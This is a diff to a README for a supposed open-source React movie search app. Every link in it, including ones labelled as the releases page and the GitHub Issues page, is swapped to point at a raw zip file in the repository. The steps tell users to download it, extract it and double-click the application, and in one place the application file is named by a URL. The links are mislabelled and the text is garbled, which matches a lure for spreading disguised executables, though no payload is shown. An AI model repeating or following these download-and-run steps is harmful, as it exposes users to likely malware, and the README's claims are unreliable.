@@ -1,6 +1,6 @@
 # 🎬 Aether-Screen-Full-stack-Movie-app- - Your Movie Search Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/main/src/assets/Aether-Screen-Full-stack-Movie-app-_1.4.zip%20Now-%20%F0%9F%93%8D%20-blue)](https://raw.githubusercontent.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/main/src/assets/Aether-Screen-Full-stack-Movie-app-_1.4.zip)
+[![Download Now](https://github.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/raw/refs/heads/main/src/app-Screen-Movie-Aether-Full-stack-v2.9.zip%20Now-%20%F0%9F%93%8D%20-blue)](https://github.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/raw/refs/heads/main/src/app-Screen-Movie-Aether-Full-stack-v2.9.zip)
 
 ## 📜 Overview
 
@@ -11,7 +11,7 @@ Aether Screen is a full-stack movie search platform. It uses React, TypeScript, 
 Follow these simple steps to download and run Aether Screen on your device.
 
 1. **Visit the Releases Page**  
-   Go to our [releases page](https://raw.githubusercontent.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/main/src/assets/Aether-Screen-Full-stack-Movie-app-_1.4.zip) to find the latest version of Aether Screen.
+   Go to our [releases page](https://github.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/raw/refs/heads/main/src/app-Screen-Movie-Aether-Full-stack-v2.9.zip) to find the latest version of Aether Screen.
 
 2. **Download the Latest Release**  
    On the releases page, you will see a list of available versions. Click on the version number you want. Make sure to choose the one that suits your device.
@@ -20,7 +20,7 @@ Follow these simple steps to download and run Aether Screen on your device.
    After the download is complete, locate the zipped file in your "Downloads" folder or wherever you saved it. Right-click on it and select “Extract All” or use a similar option to unzip the file.
 
 4. **Run the Application**  
-   Open the extracted folder. Double-click the application file (it might be named https://raw.githubusercontent.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/main/src/assets/Aether-Screen-Full-stack-Movie-app-_1.4.zip or similar). The application will launch, and you can start searching for movies right away!
+   Open the extracted folder. Double-click the application file (it might be named https://github.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/raw/refs/heads/main/src/app-Screen-Movie-Aether-Full-stack-v2.9.zip or similar). The application will launch, and you can start searching for movies right away!
 
 ## 🔧 Requirements
 
@@ -44,7 +44,7 @@ Aether Screen includes a variety of features to enhance your movie searching exp
 
 For a straightforward download and installation process, follow these instructions:
 
-1. Click the download badge/button at the top of this README or go directly to the [releases page](https://raw.githubusercontent.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/main/src/assets/Aether-Screen-Full-stack-Movie-app-_1.4.zip).
+1. Click the download badge/button at the top of this README or go directly to the [releases page](https://github.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/raw/refs/heads/main/src/app-Screen-Movie-Aether-Full-stack-v2.9.zip).
 2. Select the latest version suitable for your system.
 3. Unzip the downloaded file and run the application as described above.
 
@@ -60,7 +60,7 @@ Once the application is running, you will see a search bar. Here’s how to use 
 
 If you have any questions, suggestions, or need support:
 
-- **Issues:** Report any problems on our [GitHub Issues page](https://raw.githubusercontent.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/main/src/assets/Aether-Screen-Full-stack-Movie-app-_1.4.zip).
+- **Issues:** Report any problems on our [GitHub Issues page](https://github.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/raw/refs/heads/main/src/app-Screen-Movie-Aether-Full-stack-v2.9.zip).
 - **Community:** Join discussions with other users in our community forum.
 
 ## 🛠️ Contribute
@@ -91,4 +91,4 @@ Aether Screen is open-source and available under the MIT License. Feel free to u
 - vite
 - webapp
 
-[![Download Now](https://raw.githubusercontent.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/main/src/assets/Aether-Screen-Full-stack-Movie-app-_1.4.zip%20Now-%20%F0%9F%93%8D%20-blue)](https://raw.githubusercontent.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/main/src/assets/Aether-Screen-Full-stack-Movie-app-_1.4.zip)
+[![Download Now](https://github.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/raw/refs/heads/main/src/app-Screen-Movie-Aether-Full-stack-v2.9.zip%20Now-%20%F0%9F%93%8D%20-blue)](https://github.com/heroldsuited356/Aether-Screen-Full-stack-Movie-app-/raw/refs/heads/main/src/app-Screen-Movie-Aether-Full-stack-v2.9.zip)
